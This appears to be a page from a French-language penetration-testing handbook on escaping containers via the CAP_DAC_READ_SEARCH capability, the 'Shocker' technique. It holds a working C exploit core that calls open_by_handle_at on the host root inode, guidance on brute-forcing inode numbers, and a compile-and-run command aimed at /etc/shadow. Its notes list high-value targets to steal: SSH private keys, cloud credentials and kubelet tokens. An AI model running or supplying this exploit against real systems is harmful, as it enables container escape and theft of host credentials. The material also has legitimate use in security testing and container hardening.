---
title: "CAP_DAC_READ_SEARCH : lire n'importe quel fichier de l'hôte en force brute sur les handles d'inode"
order: 4
description: "CAP_DAC_READ_SEARCH contourne les vérifications de permissions de lecture de fichiers et de recherche de répertoires et, plus important encore, autorise open_by_handle_at. La technique Shocker l'utilise pour ouvrir des fichiers par handle d'inode brut plutôt que par chemin, échappant à la vue chroot/mount du conteneur pour lire des fichiers arbitraires de l'hôte tels que /etc/shadow."
keywords:
  - cap_dac_read_search
  - open_by_handle_at
  - shocker
  - file_handle
  - évasion de conteneur
---

# CAP_DAC_READ_SEARCH

`CAP_DAC_READ_SEARCH` contourne les vérifications discrétionnaires de lecture et de recherche de répertoires, mais sa valeur pour l'évasion vient d'un effet de bord : elle autorise `open_by_handle_at(2)`. Cet appel système ouvre un fichier à partir d'un `file_handle` opaque qui encode un numéro d'inode, et non à partir d'un chemin, de sorte qu'il n'est pas confiné à l'espace de noms de montage ni à la racine du conteneur. En devinant le handle d'un fichier du système de fichiers de l'hôte et en l'ouvrant, un attaquant lit des fichiers de l'hôte que le conteneur n'était jamais censé voir. C'est la technique Shocker.

Confirmez la capacité :

```bash
capsh --print | grep -o cap_dac_read_search
grep CapEff /proc/self/status          # bit 2 set
```

## Shocker : ouvrir par handle

Un `file_handle` pour la plupart des systèmes de fichiers Linux est petit : un type de handle, et une charge utile composée du numéro d'inode sur 32 bits plus un compteur de génération. L'inode racine d'un système de fichiers hôte ext4/xfs typique est `2`. L'attaquant a besoin de n'importe quel descripteur de fichier ouvert résidant sur le système de fichiers de l'hôte pour l'utiliser comme argument `mount_fd` ; un fichier de l'hôte bind-monté tel que `/etc/hostname` ou `/.dockerenv` remplit cet office.

```c
// shocker-style core (error handling omitted)
struct my_handle { struct file_handle fh; unsigned char data[8]; };

int mount_fd = open("/etc/hostname", O_RDONLY);   // a fd on the host fs
struct my_handle h = { .fh = { .handle_bytes = 8, .handle_type = 1 } };
*(uint32_t*)h.data = 2;          // inode 2 == filesystem root
*(uint32_t*)(h.data+4) = 0;      // generation

int root = open_by_handle_at(mount_fd, &h.fh, O_RDONLY);  // host "/"
// now walk from the host root: readdir, resolve /etc, brute inode of shadow
```

Comme les répertoires sont eux-mêmes des inodes, vous ouvrez la racine de l'hôte par son inode connu `2`, lisez ses entrées de répertoire pour trouver `etc`, l'ouvrez, et descendez jusqu'à `shadow`. Lorsque les noms ne sont pas lisibles, forcez le numéro d'inode : la charge utile du handle ne fait que quelques octets, donc itérer sur des inodes candidats et tenter `open_by_handle_at` récupère rapidement les fichiers visés.

```bash
# compile and run a shocker build against a mounted host fd
gcc shocker.c -o shocker && ./shocker /etc/hostname /etc/shadow
```

## Notes d'exploitation

- C'est une primitive de lecture, pas une exécution de code. Ses cibles à plus forte valeur sont `/etc/shadow` pour un cassage hors ligne, les clés privées sous `/root/.ssh` et `/home/*/.ssh`, les fichiers d'identifiants cloud, et les jetons kubelet ou de compte de service sur un nœud.
- Le `mount_fd` doit résider sur le même système de fichiers que la cible. Les bind mounts Docker comme `/etc/resolv.conf`, `/etc/hostname` et `/etc/hosts` se trouvent généralement sur le système de fichiers racine de l'hôte, qui est précisément là où sont les fichiers sensibles.
- Associez le `/etc/shadow` récupéré à un cassage hors ligne, ou enchaînez une clé privée récupérée vers une session interactive sur l'hôte. Pour un accès en écriture, combinez avec [CAP_DAC_OVERRIDE](cap-dac-override.md).

## Outils

- [shocker.c (PoC original de Sebastian Krahmer)](https://github.com/gabrtv/shocker)

## Références

- [man 2 open_by_handle_at](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)
- [HackTricks : CAP_DAC_READ_SEARCH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search)
